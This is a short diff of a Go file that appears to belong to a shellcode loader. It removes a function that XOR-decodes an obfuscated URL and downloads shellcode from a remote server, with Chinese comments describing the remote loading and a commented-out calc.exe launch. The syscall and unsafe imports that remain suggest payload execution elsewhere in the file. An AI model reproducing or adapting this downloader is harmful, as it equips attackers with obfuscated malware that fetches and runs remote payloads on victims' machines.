@@ -1,9 +1,6 @@
 package encry
 
 import (
-	"io/ioutil"
-	"log"
-	"net/http"
 	"os"
 	"syscall"
 	"unsafe"
@@ -42,30 +39,6 @@ func checkErr(err error) {
 			os.Exit(1)
 		}
 	}
-}
-
-func getCode(key string) []byte {
-	xor := Xor{}
-	//远程加载
-	//Url0:= xor.d("daed8f25d0556d6fd037583947598324928")
-	url0 := xor.D(key)
-
-	var CL http.Client
-	//_ = exec.Command("calc.exe").Start()
-	//下方拼接shellcode文件名到url上
-	resp, err := CL.Get(url0 + "x")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer resp.Body.Close()
-	if resp.StatusCode == http.StatusOK {
-		bodyBytes, err := ioutil.ReadAll(resp.Body)
-		if err != nil {
-			log.Fatal(err)
-		}
-		return bodyBytes
-	}
-	return []byte{}
 }
 
 func main() {
